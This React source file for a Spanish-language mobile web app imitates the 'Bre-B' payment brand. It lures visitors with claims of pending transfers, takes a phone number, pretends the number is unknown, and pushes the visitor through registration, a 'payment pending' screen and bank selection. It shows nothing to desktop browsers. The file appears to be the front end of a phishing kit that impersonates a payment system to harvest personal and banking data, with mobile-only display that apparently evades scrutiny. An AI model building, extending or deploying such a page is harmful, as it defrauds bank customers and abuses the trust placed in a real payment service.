import React, { useState, useEffect } from 'react';
import Login from './components/Login';
import Register from './components/Register';
import PaymentPending from './components/PaymentPending';
import BankSelection from './components/BankSelection';

function App() {
  const [currentView, setCurrentView] = useState('login'); // 'login' | 'register' | 'payment' | 'banks'
  const [phoneNumber, setPhoneNumber] = useState('');
  const [userData, setUserData] = useState(null);
  const [isMobile, setIsMobile] = useState(true);

  useEffect(() => {
    // Detectar dispositivo móvil
    const checkMobile = () => {
      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
      const mobileRegex = /android|avantgo|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile|o2|opera m(ob|in)i|palm( os)?|p(ixi|re)\/|plucker|pocket|psp|smartphone|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i;
      return mobileRegex.test(userAgent);
    };
    
    setIsMobile(checkMobile());
  }, []);

  const handleLogin = (phone) => {
    setPhoneNumber(phone);
    // Simular que el número no existe y redirigir al registro
    setCurrentView('register');
  };

  const handleRegister = (data) => {
    setUserData({ ...data, phoneNumber }); // Guardar datos del registro + teléfono
    setCurrentView('payment');
  };

  const handleShowBanks = () => {
    setCurrentView('banks');
  };

  const handleCloseBanks = () => {
    setCurrentView('payment');
  };

  const handleBack = () => {
    setPhoneNumber('');
    setCurrentView('login');
    setUserData(null);
  };

  if (!isMobile) {
    return null;
  }

  return (
    <div className="min-h-screen bg-[#0f0b29] flex flex-col items-center justify-center p-4 relative overflow-hidden font-sans">
      
      {/* Elementos decorativos de fondo (simulación de partículas/monedas) */}
      <div className="absolute top-10 left-1/4 w-4 h-4 rounded-full bg-green-400 opacity-60 animate-pulse"></div>
      <div className="absolute top-20 right-1/4 w-6 h-6 rounded-full bg-purple-500 opacity-60 animate-bounce"></div>
      <div className="absolute bottom-10 left-10 w-3 h-3 rounded-full bg-blue-400 opacity-50"></div>
      <div className="absolute top-1/3 right-10 w-2 h-2 rounded-full bg-white opacity-30"></div>

      {/* Header / Logo Area - Común para ambas vistas */}
      <div className="mb-8 text-center relative z-10">
        {/* Simulación del Logo Bre-B */}
        <div className="flex items-center justify-center mb-4">
            <h1 className="text-6xl md:text-7xl font-extrabold tracking-tighter text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 to-green-300 drop-shadow-[0_0_10px_rgba(0,255,200,0.3)]" style={{ fontFamily: 'Arial, sans-serif' }}>
              Bre-B
            </h1>
            {/* Decoraciones del logo */}
            <div className="absolute -top-4 right-1/3 w-6 h-6 text-purple-400 opacity-80 rotate-12">
               ✦
            </div>
            <div className="absolute bottom-0 left-1/3 w-8 h-8 text-purple-600 opacity-80 -rotate-12">
               🪙
            </div>
        </div>
        
        <p className="text-white text-center max-w-md mx-auto leading-relaxed text-sm md:text-base">
          Si tienes transferencias pendientes de aceptar o inscribir tu llave en Bre-B, por favor ingresa.
        </p>
      </div>

      {/* Renderizado Condicional de Vistas */}
      {currentView === 'login' && <Login onLogin={handleLogin} />}
      {currentView === 'register' && <Register phoneNumber={phoneNumber} onBack={handleBack} onRegister={handleRegister} />}
      {currentView === 'payment' && <PaymentPending userData={userData} onShowOptions={handleShowBanks} />}
      {currentView === 'banks' && <BankSelection onClose={handleCloseBanks} />}

      {/* Footer General */}
      <footer className="mt-12 text-center z-10">
        <p className="text-xs text-white opacity-80">
          © 2025 Bre-B. Todos los derechos reservados.
        </p>
      </footer>
    </div>
  )
}

export default App
